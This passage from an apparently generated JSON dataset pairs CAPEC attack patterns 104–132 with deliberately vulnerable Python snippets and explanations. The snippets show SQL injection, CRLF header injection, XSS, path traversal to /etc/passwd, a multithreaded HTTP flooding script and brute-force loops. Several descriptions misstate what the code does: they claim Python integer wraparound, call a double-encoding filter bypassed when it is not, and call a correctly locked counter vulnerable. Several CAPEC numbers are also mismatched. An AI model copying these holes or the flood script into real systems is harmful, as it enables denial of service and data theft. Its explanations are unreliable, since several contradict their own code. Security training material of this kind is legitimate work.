        "description": "This Python code snippet creates a simple Flask web application that is vulnerable to clickjacking. The main page of the application includes an iframe that loads content from a potentially malicious site (http://malicious-site.com). This setup can trick users into interacting with the malicious site while they believe they are interacting with the legitimate site. The vulnerability arises from the improper restriction of rendered UI layers or frames (CWE-1021). The code does not implement any frame-busting techniques, making it susceptible to clickjacking attacks."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "import webbrowser\n\n# CWE-250: Execution with Unnecessary Privileges\n# CWE-285: Improper Authorization\n# CWE-116: Improper Encoding or Escaping of Output\n# CWE-20: Improper Input Validation\n\n# Simulate user input for URL\nuser_input = \"http://example.com\"\n\n# CWE-20: Improper Input Validation\n# No validation on user input\nurl = user_input\n\n# CWE-116: Improper Encoding or Escaping of Output\n# Directly using user input without encoding\nwebbrowser.open(url)\n\n# CWE-250: Execution with Unnecessary Privileges\n# Running with elevated privileges\nimport os\nos.system('echo Running with elevated privileges')\n\n# CWE-285: Improper Authorization\n# No authorization check before opening the URL\nprint(f\"Opening {url} in web browser...\")",
        "description": "This Python code snippet demonstrates a scenario where an attacker can exploit cross-zone scripting vulnerabilities. The code takes a user-provided URL without proper validation (CWE-20) and directly opens it in a web browser without encoding or escaping (CWE-116). Additionally, the script runs with elevated privileges (CWE-250) and does not perform any authorization checks before opening the URL (CWE-285). This can lead to a privilege elevation attack where malicious content can be loaded into the victim's web browser, bypassing security zone controls."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "from http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass VulnerableHTTPRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        # Extracting user input from query parameters\n        user_input = self.path.split('?')[1] if '?' in self.path else ''\n        # Improper neutralization of CRLF sequences\n        response_header = f\"Set-Cookie: sessionId={user_input}\\r\\n\"\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.send_header('Set-Cookie', response_header)\n        self.end_headers()\n        self.wfile.write(b\"<html><body><h1>Vulnerable HTTP Server</h1></body></html>\")\n\nif __name__ == '__main__':\n    server = HTTPServer(('localhost', 8080), VulnerableHTTPRequestHandler)\n    print('Starting server at http://localhost:8080')\n    server.serve_forever()",
        "description": "This Python code snippet demonstrates a vulnerable HTTP server that is susceptible to HTTP Request Splitting attacks. The server extracts user input from the query parameters of a GET request and directly includes it in the 'Set-Cookie' HTTP header without properly neutralizing CRLF sequences. This can allow an attacker to inject additional headers or even split the HTTP request, leading to potential security issues such as session hijacking or cache poisoning. The code highlights the importance of properly sanitizing and neutralizing user input to prevent such vulnerabilities."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "import logging\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\n@app.route('/log', methods=['GET', 'POST'])\ndef log():\n    if request.method == 'POST':\n        user_input = request.form['user_input']\n        logging.info(f'User input: {user_input}')\n        return 'Logged!'\n    return '''<form method=\"post\">\n                  <input type=\"text\" name=\"user_input\">\n                  <input type=\"submit\">\n              </form>'''\n\n@app.route('/display')\ndef display():\n    with open('app.log', 'r') as file:\n        log_content = file.read()\n    return render_template_string(f'<pre>{log_content}</pre>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that logs user input to a file and then displays the log content on a web page. The '/log' route accepts user input via a POST request and logs it using Python's logging module. The '/display' route reads the log file and displays its content on a web page using Flask's render_template_string function. This code is vulnerable to Cross-Site Scripting (XSS) attacks because it does not properly neutralize user input before logging it and displaying it on a web page. An attacker could inject malicious scripts into the log file, which would then be executed when the log content is displayed, exemplifying CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-532 (Information Exposure Through Log Files)."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "from http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass VulnerableHTTPRequestHandler(BaseHTTPRequestHandler):\n    def do_TRACE(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'message/http')\n        self.end_headers()\n        self.wfile.write(self.raw_requestline + b'\\r\\n' + self.headers.as_bytes() + b'\\r\\n')\n\nif __name__ == '__main__':\n    server = HTTPServer(('localhost', 8080), VulnerableHTTPRequestHandler)\n    print('Starting server at http://localhost:8080')\n    server.serve_forever()",
        "description": "This Python code snippet sets up a simple HTTP server that handles TRACE requests, which is a key aspect of Cross Site Tracing (XST). The `do_TRACE` method responds to TRACE requests by echoing back the request line and headers. This can expose sensitive information such as session cookies, making it vulnerable to XST attacks. The code demonstrates a Protection Mechanism Failure (CWE-693) by not disabling the TRACE method, and it also shows Incorrect Use of Privileged APIs (CWE-648) by mishandling HTTP methods. Additionally, it indirectly relates to Cross-Site Scripting (CWE-79) and Cross-Site Request Forgery (CWE-352) by potentially exposing session data that could be exploited in these types of attacks."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "import sqlite3\nimport os\n\ndef execute_command(user_input):\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    \n    # Vulnerable SQL query construction\n    query = f\"SELECT command FROM commands WHERE user='{user_input}'\"\n    cursor.execute(query)\n    result = cursor.fetchone()\n    \n    if result:\n        command = result[0]\n        # Vulnerable OS command execution\n        os.system(command)\n    \n    conn.close()\n\n# Example of user input that could be malicious\nuser_input = \"' OR '1'='1\"  # SQL Injection\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can inject SQL commands to manipulate the database query and subsequently execute arbitrary OS commands. The `execute_command` function takes user input, constructs an SQL query without proper sanitization, and executes it. If the query returns a result, it then executes the command using `os.system`, which can lead to OS command injection. This code embodies the main idea of CAPEC-66 (Command Line Execution through SQL Injection) and highlights related CWEs such as CWE-89 (SQL Injection), CWE-78 (OS Command Injection), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "from sqlalchemy import create_engine\nfrom sqlalchemy.orm import sessionmaker\n\n# Database connection setup\nengine = create_engine('sqlite:///example.db')\nSession = sessionmaker(bind=engine)\nsession = Session()\n\n# User input\nuser_input = \"1 OR 1=1\"\n\n# Vulnerable ORM query\nquery = f\"SELECT * FROM users WHERE id = {user_input}\"\nresult = session.execute(query)\n\n# Process result\nfor row in result:\n    print(row)",
        "description": "This Python code snippet demonstrates a vulnerable Object Relational Mapping (ORM) injection scenario using SQLAlchemy, an ORM tool. The code sets up a database connection and a session, then constructs a SQL query using user input directly within the query string. This is a classic example of SQL injection vulnerability (CWE-89, CWE-564) because the user input is not properly sanitized or validated (CWE-20, CWE-943). An attacker can manipulate the 'user_input' variable to alter the SQL query's logic, potentially gaining unauthorized access to the database. The code highlights the importance of using parameterized queries or ORM-provided safe methods to prevent such vulnerabilities."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport sqlite3\n\n# Sample SOAP message with user input\nsoap_message = '''\n<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\">\n  <soap:Body>\n    <GetUserInfo>\n      <UserID>1 OR 1=1</UserID>\n    </GetUserInfo>\n  </soap:Body>\n</soap:Envelope>\n'''\n\n# Parse the SOAP message\nroot = ET.fromstring(soap_message)\nuser_id = root.find('.//UserID').text\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# Vulnerable SQL query construction\nquery = f\"SELECT * FROM users WHERE id = {user_id}\"\n\n# Execute the query\ntry:\n    cursor.execute(query)\n    result = cursor.fetchall()\n    print(result)\nexcept sqlite3.Error as e:\n    print(f\"An error occurred: {e}\")\n\n# Close the connection\nconn.close()",
        "description": "This Python code snippet demonstrates a SQL Injection vulnerability through SOAP parameter tampering. The SOAP message contains a user input field 'UserID' which is extracted and directly used to construct an SQL query without proper validation or parameter binding. This allows an attacker to manipulate the 'UserID' parameter to alter the SQL query's structure, leading to potential unauthorized data access. The code also highlights the risk of generating error messages that may contain sensitive information about the database environment."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "from flask import Flask, request, jsonify\nimport json\n\napp = Flask(__name__)\n\n@app.route('/data', methods=['GET'])\ndef get_data():\n    # Simulated sensitive data\n    data = {'user': 'admin', 'password': 'secret'}\n    callback = request.args.get('callback')\n    if callback:\n        # Vulnerable to JSON Hijacking\n        response = f'{callback}({json.dumps(data)})'\n        return app.response_class(response, mimetype='application/javascript')\n    return jsonify(data)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to JSON Hijacking. The '/data' endpoint returns sensitive data in JSON format. If a 'callback' parameter is provided in the request, the server wraps the JSON data in a JavaScript function call, making it vulnerable to JSON Hijacking. This allows an attacker to steal the JSON data by including the endpoint in a script tag on a malicious website. The code also highlights related weaknesses such as insufficient verification of data authenticity (CWE-345), origin validation error (CWE-346), and client-side enforcement of server-side security (CWE-602)."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "import random\nimport string\n\n# Weak password generation (CWE-521)\ndef generate_weak_password():\n    return ''.join(random.choice(string.ascii_lowercase) for _ in range(6))\n\n# Simulate a login function with weak authentication (CWE-1390)\nusers = {'user1': generate_weak_password()}\n\n# Improper restriction of excessive authentication attempts (CWE-307)\ndef login(username, password):\n    if username in users and users[username] == password:\n        return 'Login successful'\n    return 'Login failed'\n\n# Brute force attack simulation\nusername = 'user1'\nfor attempt in range(1000):\n    guess = generate_weak_password()\n    if login(username, guess) == 'Login successful':\n        print(f'Brute force successful: {guess}')\n        break",
        "description": "This Python code snippet demonstrates a brute force attack on a system with several vulnerabilities. The `generate_weak_password` function creates weak passwords (CWE-521) by generating a 6-character string of lowercase letters. The `login` function simulates a login mechanism with weak authentication (CWE-1390) and does not restrict excessive authentication attempts (CWE-307). The brute force attack is simulated by repeatedly guessing passwords until a successful login is achieved. This code embodies the main idea of the CAPEC by showing how an attacker can exploit weak password requirements and insufficient authentication mechanisms to gain unauthorized access through trial-and-error."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "import ctypes\n\n# Simulate memory-mapped I/O register access\nclass MemoryMappedIO:\n    def __init__(self, address):\n        self.address = address\n        self.value = 0\n\n    def read(self):\n        return self.value\n\n    def write(self, value):\n        self.value = value\n\n# Simulate improper access control to a register\nclass Device:\n    def __init__(self):\n        self.register = MemoryMappedIO(0x1000)\n\n    def read_register(self):\n        return self.register.read()\n\n    def write_register(self, value):\n        self.register.write(value)\n\n# Simulate an exposed IOCTL with insufficient access control\nclass DeviceDriver:\n    def __init__(self):\n        self.device = Device()\n\n    def ioctl(self, command, value=None):\n        if command == 'READ':\n            return self.device.read_register()\n        elif command == 'WRITE' and value is not None:\n            self.device.write_register(value)\n        else:\n            raise ValueError('Invalid command')\n\n# Simulate an attacker manipulating the interface\nif __name__ == '__main__':\n    driver = DeviceDriver()\n    # Attacker writes to the register without proper access control\n    driver.ioctl('WRITE', 0xDEADBEEF)\n    # Attacker reads the register to confirm the write\n    print(f'Register value: {hex(driver.ioctl('READ'))}')",
        "description": "This Python code snippet simulates a scenario where an attacker manipulates an interface to bypass access control and execute unintended functionality. The `MemoryMappedIO` class represents a memory-mapped I/O register, and the `Device` class simulates a device with a register interface. The `DeviceDriver` class exposes an IOCTL interface with insufficient access control, allowing an attacker to write to and read from the register without proper authorization. This demonstrates the concept of interface manipulation, where an adversary can exploit improper access control mechanisms to compromise the system."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "import hashlib\n\n# Weak authentication mechanism\nusers = {'admin': '5f4dcc3b5aa765d61d8327deb882cf99'}  # password is 'password' hashed with MD5\n\n# Function to authenticate user\ndef authenticate(username, password):\n    hashed_password = hashlib.md5(password.encode()).hexdigest()\n    if username in users and users[username] == hashed_password:\n        return True\n    return False\n\n# Simulate an authentication attempt\nusername = 'admin'\npassword = 'password'\n\nif authenticate(username, password):\n    print('Access granted')\nelse:\n    print('Access denied')\n\n# Brute force vulnerability: No restriction on authentication attempts\nfor i in range(1000):\n    if authenticate('admin', 'password' + str(i)):\n        print('Brute force successful')\n        break",
        "description": "This Python code snippet demonstrates a weak authentication mechanism vulnerable to multiple issues described in the CAPEC and related CWEs. The code uses an MD5 hash for password storage, which is considered weak (CWE-1390). The `authenticate` function checks the username and hashed password against a stored value but does not sufficiently prove the identity (CWE-287). Additionally, there is no restriction on the number of authentication attempts, making it susceptible to brute force attacks (CWE-307). The code simulates an authentication attempt and a brute force attack loop, highlighting the vulnerabilities in the authentication scheme."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "import hashlib\n\n# Simulated user database\nusers = {\n    'admin': '5f4dcc3b5aa765d61d8327deb882cf99'  # 'password' hashed with MD5\n}\n\n# Function to authenticate user\ndef authenticate(username, password):\n    if username in users:\n        hashed_password = hashlib.md5(password.encode()).hexdigest()\n        if users[username] == hashed_password:\n            return True\n    return False\n\n# Bypass authentication by directly setting a flag\nis_authenticated = False\n\n# Simulated login attempt\nusername = 'admin'\npassword = 'password'\n\nif authenticate(username, password):\n    is_authenticated = True\nelse:\n    # Bypass authentication by setting the flag directly\n    is_authenticated = True\n\nif is_authenticated:\n    print('Access granted to protected data')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates an authentication bypass vulnerability. The `authenticate` function checks if the provided username and password match the stored credentials using MD5 hashing. However, even if authentication fails, the code sets the `is_authenticated` flag to `True`, effectively bypassing the authentication mechanism. This represents the CAPEC 'Authentication Bypass' by allowing access to protected data without proper authentication. The use of MD5 hashing also highlights CWE-287 (Improper Authentication) and CWE-1390 (Weak Authentication), as MD5 is considered a weak hashing algorithm."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "import os\n\n# CWE-426: Untrusted Search Path\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-1243: Sensitive Non-Volatile Information Not Protected During Debug\n\n# Simulate an untrusted search path vulnerability\nsearch_path = os.getenv('UNTRUSTED_PATH', '/default/path')\n\n# Function to read sensitive information\n# This simulates exposure of sensitive information\n# and lack of protection during debug\n\ndef read_sensitive_info():\n    try:\n        with open(os.path.join(search_path, 'sensitive_info.txt'), 'r') as file:\n            sensitive_data = file.read()\n            print('Sensitive Data:', sensitive_data)\n    except FileNotFoundError:\n        print('Sensitive information file not found.')\n\n# Simulate an adversary probing for sensitive information\nread_sensitive_info()",
        "description": "This Python code snippet demonstrates a scenario where an adversary can exploit an untrusted search path (CWE-426) to access sensitive information (CWE-200) that is not protected during debug (CWE-1243). The code reads a sensitive information file from a path that is influenced by an environment variable, which could be controlled by an attacker. This simulates the 'Excavation' CAPEC, where an adversary actively probes the target to solicit sensitive information for malicious purposes."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "import socket\n\n# Vulnerable code: Transmitting sensitive information in cleartext\nserver_address = ('localhost', 10000)\n\n# Create a TCP/IP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect the socket to the port where the server is listening\nsock.connect(server_address)\n\ntry:\n    # Send sensitive data in cleartext\n    message = 'username=admin&password=secret'\n    sock.sendall(message.encode('utf-8'))\n\n    # Look for the response\n    data = sock.recv(1024)\n    print('Received:', data.decode('utf-8'))\n\nfinally:\n    sock.close()",
        "description": "This Python code snippet demonstrates a vulnerable implementation where sensitive information (username and password) is transmitted in cleartext over a network. The code creates a TCP/IP socket, connects to a server, and sends a message containing sensitive data without any encryption. This embodies the main idea of the CAPEC 'Interception' attack pattern, where an adversary can monitor data streams to gather sensitive information. The related CWE-319 (Cleartext Transmission of Sensitive Information) is directly represented here, as the sensitive data is not protected during transmission, making it susceptible to interception by unauthorized actors."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "import urllib.parse\n\ndef is_safe_input(user_input):\n    # Incomplete list of disallowed inputs\n    disallowed_inputs = ['<script>', '..', '%2E']\n    \n    # Validate before filtering\n    if any(bad in user_input for bad in disallowed_inputs):\n        return False\n    \n    # Improper handling of URL encoding\n    decoded_input = urllib.parse.unquote(user_input)\n    \n    # Check again after decoding\n    if any(bad in decoded_input for bad in disallowed_inputs):\n        return False\n    \n    return True\n\n# Example usage\nuser_input = '%252E%252E%252Fetc%252Fpasswd'  # Double encoded path traversal attempt\nprint(is_safe_input(user_input))  # This should return False but will return True due to improper handling",
        "description": "This Python code snippet demonstrates a vulnerability related to double encoding, as described in the CAPEC. The function `is_safe_input` is intended to check if a user input is safe by looking for disallowed patterns. However, it contains several weaknesses:\n\n1. **Incomplete List of Disallowed Inputs (CWE-184)**: The list of disallowed inputs is not comprehensive, missing many potential malicious patterns.\n2. **Validate Before Filter (CWE-181)**: The input is validated before being properly filtered or decoded, which can miss malicious patterns that become apparent only after decoding.\n3. **Improper Handling of URL Encoding (CWE-177)**: The function decodes the input only once, which can miss double-encoded malicious patterns.\n\nIn the example usage, the input '%252E%252E%252Fetc%252Fpasswd' is a double-encoded path traversal attempt. The function `is_safe_input` incorrectly returns `True`, demonstrating how double encoding can bypass the filter and validation checks."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "import os\n\nclass ProductionSystem:\n    def __init__(self):\n        self.debug_mode = os.getenv('DEBUG_MODE', 'False') == 'True'\n        self.security_token = self.generate_security_token()\n\n    def generate_security_token(self):\n        if self.debug_mode:\n            # Insecure token generation for debugging purposes\n            return 'DEBUG-TOKEN-1234'\n        else:\n            # Proper token generation for production\n            return 'PROD-TOKEN-5678'\n\n    def debug_info(self):\n        if self.debug_mode:\n            # Exposing sensitive information in debug mode\n            return 'Sensitive debug information'\n        else:\n            return 'No debug information available'\n\n# Simulate a production environment with debug mode enabled\nos.environ['DEBUG_MODE'] = 'True'\n\nsystem = ProductionSystem()\nprint(system.debug_info())\nprint(system.security_token)",
        "description": "This Python code snippet demonstrates a production system that has a debug mode unintentionally enabled. The `ProductionSystem` class initializes with a `debug_mode` flag based on an environment variable. If `debug_mode` is enabled, the system generates an insecure debug security token and exposes sensitive debug information. This represents the CAPEC idea of exploiting non-production interfaces, where an adversary can leverage debug functionality to gain unauthorized access or information. The code also touches on related CWEs such as active debug code (CWE-489), insecure security token generation (CWE-1270), and debug messages revealing unnecessary information (CWE-1295)."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "class User:\n    def __init__(self, username, role):\n        self.username = username\n        self.role = role\n\nclass Resource:\n    def __init__(self, name, sensitive_data):\n        self.name = name\n        self.sensitive_data = sensitive_data\n\n    def access_resource(self, user):\n        if user.role == 'admin':\n            return self.sensitive_data\n        else:\n            return 'Access Denied'\n\n# Example usage\nadmin_user = User('admin', 'admin')\nregular_user = User('user', 'user')\nresource = Resource('confidential', 'Top Secret Data')\n\n# Admin access\nprint(resource.access_resource(admin_user))  # Expected: 'Top Secret Data'\n\n# Regular user access\nprint(resource.access_resource(regular_user))  # Expected: 'Access Denied'\n\n# Vulnerability: Improper privilege management\nregular_user.role = 'admin'  # Privilege escalation\nprint(resource.access_resource(regular_user))  # Now returns: 'Top Secret Data'",
        "description": "This Python code snippet demonstrates a simple privilege abuse scenario. The `User` class represents a user with a username and role, while the `Resource` class represents a resource containing sensitive data. The `access_resource` method checks if the user has an 'admin' role before granting access to the sensitive data. However, the code is vulnerable to privilege escalation because a regular user can change their role to 'admin' and gain unauthorized access to the sensitive data. This example embodies the main idea of CAPEC-119 (Privilege Abuse) and highlights related CWEs such as CWE-269 (Improper Privilege Management) and CWE-284 (Improper Access Control)."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "def vulnerable_function(input_data):\n    buffer = [0] * 10  # Fixed-size buffer\n    for i in range(len(input_data)):\n        buffer[i] = input_data[i]  # No bounds checking\n    return buffer\n\n# Example usage\ninput_data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]  # Input larger than buffer\nresult = vulnerable_function(input_data)\nprint(result)",
        "description": "This Python code snippet demonstrates a buffer manipulation vulnerability, specifically a buffer overflow (CWE-119). The function `vulnerable_function` takes an input list `input_data` and attempts to copy its contents into a fixed-size buffer of 10 elements. However, there is no bounds checking to ensure that the input data fits within the buffer. If `input_data` is larger than the buffer, this will result in writing past the end of the buffer, potentially overwriting other memory locations. This embodies the main idea of the CAPEC description, where the buffer space itself is the target of the attack, and the content placed in the buffer is immaterial. The code also touches on CWE-1285, as it does not validate the index or position when accessing the buffer."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "import threading\n\n# Shared resource\nshared_counter = 0\n\n# Lock for synchronizing access to the shared resource\nlock = threading.Lock()\n\n# Function that increments the shared counter\ndef increment_counter():\n    global shared_counter\n    for _ in range(100000):\n        with lock:\n            shared_counter += 1\n\n# Function that decrements the shared counter\ndef decrement_counter():\n    global shared_counter\n    for _ in range(100000):\n        with lock:\n            shared_counter -= 1\n\n# Create threads\nthread1 = threading.Thread(target=increment_counter)\nthread2 = threading.Thread(target=decrement_counter)\n\n# Start threads\nthread1.start()\nthread2.start()\n\n# Wait for threads to complete\nthread1.join()\nthread2.join()\n\nprint(f'Final value of shared_counter: {shared_counter}')",
        "description": "This Python code snippet demonstrates a scenario where multiple threads access and manipulate a shared resource, `shared_counter`. The `increment_counter` function increments the shared counter, while the `decrement_counter` function decrements it. Both functions use a lock to synchronize access to the shared resource, ensuring that only one thread can modify the counter at a time. This setup represents the main idea of CAPEC-132: 'Shared Resource Manipulation', where improper synchronization (CWE-662) can lead to race conditions and data corruption. The use of a lock here is an attempt to mitigate such issues, but if the lock were not used, it would exemplify the vulnerability described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "import threading\nimport requests\n\n# URL to target\nurl = 'http://example.com'\n\n# Function to perform a large number of requests\ndef flood_target():\n    while True:\n        try:\n            response = requests.get(url)\n            print(f'Status Code: {response.status_code}')\n        except requests.exceptions.RequestException as e:\n            print(f'Request failed: {e}')\n\n# Create multiple threads to simulate a flood attack\nthreads = []\nfor i in range(100):  # Adjust the number of threads to increase/decrease the attack intensity\n    thread = threading.Thread(target=flood_target)\n    threads.append(thread)\n    thread.start()\n\n# Join threads to ensure they run indefinitely\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a basic flooding attack by creating multiple threads that continuously send HTTP GET requests to a target URL. The code does not implement any rate limiting or resource throttling, embodying the CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-400 (Uncontrolled Resource Consumption) weaknesses. The main idea of the CAPEC 'Flooding' is represented by the rapid and large number of interactions with the target, which can lead to resource exhaustion and denial of service for legitimate users."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    base_directory = '/var/www/data/'\n    full_path = os.path.join(base_directory, file_path)\n    \n    try:\n        with open(full_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found.'\n\n# Example usage\nuser_input = '../../etc/passwd'\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a path traversal vulnerability. The function `read_file` takes a `file_path` as input, which is intended to be a relative path within a restricted directory (`/var/www/data/`). However, the code does not properly validate or sanitize the `file_path` input. As a result, an attacker can provide a path like `../../etc/passwd` to traverse out of the restricted directory and access sensitive files on the system. This embodies the main idea of the CAPEC and related CWEs, where insufficient input validation allows an attacker to manipulate the file path and access unauthorized files."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\n\n@app.route('/files/<path:filename>', methods=['GET'])\ndef download_file(filename):\n    # CWE-276: Incorrect Default Permissions\n    directory = '/var/www/files'\n    try:\n        # CWE-425: Direct Request ('Forced Browsing')\n        return send_from_directory(directory, filename)\n    except FileNotFoundError:\n        return 'File not found', 404\n\n@app.route('/list', methods=['GET'])\ndef list_directory():\n    # CWE-424: Improper Protection of Alternate Path\n    directory = '/var/www/files'\n    try:\n        # CWE-732: Incorrect Permission Assignment for Critical Resource\n        files = os.listdir(directory)\n        return '<br>'.join(files)\n    except Exception as e:\n        return str(e), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates the concept of Directory Indexing (CAPEC-126). The application has two routes: one for downloading files and another for listing the contents of a directory. The '/files/<path:filename>' route allows users to download files directly by specifying the filename in the URL, which can lead to CWE-425 (Direct Request or 'Forced Browsing'). The '/list' route lists all files in a specified directory, which can expose sensitive information and lead to CWE-424 (Improper Protection of Alternate Path) and CWE-732 (Incorrect Permission Assignment for Critical Resource). The code also demonstrates CWE-276 (Incorrect Default Permissions) by assuming the directory has default permissions that may not be secure. This setup can allow an adversary to explore the directory tree and access sensitive files, embodying the main idea of Directory Indexing."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "def add_numbers(a, b):\n    return a + b\n\n# Example usage\nmax_int = 2147483647  # Maximum value for a 32-bit signed integer\nresult = add_numbers(max_int, 1)\nprint(f\"Result: {result}\")",
        "description": "This Python code snippet demonstrates an integer overflow vulnerability. The function `add_numbers` takes two integers as input and returns their sum. The example usage shows adding 1 to the maximum value of a 32-bit signed integer (`2147483647`). This operation causes an integer overflow, resulting in an unexpected negative value due to the wraparound behavior of integers. This embodies the main idea of the CAPEC 'Integer Attacks' by exploiting the structure of integer variables to produce unintended results. The related CWEs are represented as follows: CWE-190 (Integer Overflow or Wraparound) is directly demonstrated, and CWE-682 (Incorrect Calculation) is implied as the calculation does not produce the expected result."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "import ctypes\n\n# Simulate untrusted input\nuntrusted_input = -1\n\n# Convert untrusted input to a pointer\nptr = ctypes.c_void_p(untrusted_input)\n\n# Dereference the pointer\ntry:\n    value = ctypes.cast(ptr, ctypes.POINTER(ctypes.c_int)).contents.value\n    print(f'Dereferenced value: {value}')\nexcept ValueError as e:\n    print(f'Error: {e}')\nexcept Exception as e:\n    print(f'Unexpected error: {e}')",
        "description": "This Python code snippet demonstrates a pointer manipulation vulnerability. It simulates receiving an untrusted input, converts this input to a pointer, and then attempts to dereference the pointer. The untrusted input is set to -1, which is an invalid memory address. This can lead to undefined behavior, including crashes or unintended memory access. The code captures and prints errors that occur during dereferencing. This snippet embodies the main idea of the CAPEC by showing how manipulating a pointer with an untrusted value can lead to accessing unintended memory locations, potentially causing security issues. The related CWEs are represented by the incorrect calculation of the pointer value, the use of an untrusted pointer, and the potential for out-of-range pointer offsets."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "import os\n\ndef allocate_excessive_memory(size):\n    try:\n        # CWE-770: Allocation of Resources Without Limits or Throttling\n        data = 'A' * size\n        return data\n    except MemoryError:\n        # Handle memory allocation error\n        return None\n\n# CWE-400: Uncontrolled Resource Consumption\n# Allocate a very large amount of memory\nlarge_size = 10**9  # 1 GB\nresult = allocate_excessive_memory(large_size)\n\nif result is None:\n    print('Memory allocation failed')\nelse:\n    print('Memory allocated successfully')\n\n# CWE-404: Improper Resource Shutdown or Release\n# Not releasing the allocated memory explicitly\n# This can lead to memory leaks and resource exhaustion\n# In a real-world scenario, you should release resources properly\n",
        "description": "This Python code snippet demonstrates an excessive allocation attack by attempting to allocate a large amount of memory (1 GB) in a single request. The function `allocate_excessive_memory` tries to allocate the specified size of memory without any limits or throttling (CWE-770). If the allocation fails due to insufficient memory, it catches the `MemoryError` and returns `None`. The main part of the code calls this function with a large size, simulating an attack that forces the target to allocate excessive resources (CAPEC-130). Additionally, the code does not explicitly release the allocated memory, illustrating improper resource shutdown or release (CWE-404), which can lead to resource exhaustion over time. This snippet embodies the main idea of causing resource exhaustion through excessive allocation without proper limits or cleanup."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "import threading\n\nclass Resource:\n    def __init__(self):\n        self.lock = threading.Lock()\n        self.data = []\n\n    def add_data(self, item):\n        self.lock.acquire()\n        try:\n            self.data.append(item)\n        finally:\n            # Improper release of resource: lock is not released\n            pass\n\n    def get_data(self):\n        self.lock.acquire()\n        try:\n            return self.data\n        finally:\n            self.lock.release()\n\nresource = Resource()\n\n# Simulate resource usage\nfor i in range(100):\n    threading.Thread(target=resource.add_data, args=(i,)).start()\n\n# Attempt to access the resource\nprint(resource.get_data())",
        "description": "This Python code snippet demonstrates a resource leak vulnerability by improperly managing a threading lock. The `Resource` class has a lock to manage concurrent access to its `data` attribute. The `add_data` method acquires the lock but fails to release it, simulating an improper resource shutdown or release (CWE-404). This can lead to a resource leak where the lock is never released, causing threads to hang and depleting the resource availability for legitimate requests. The `get_data` method correctly releases the lock, but due to the improper release in `add_data`, the resource can become unavailable, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
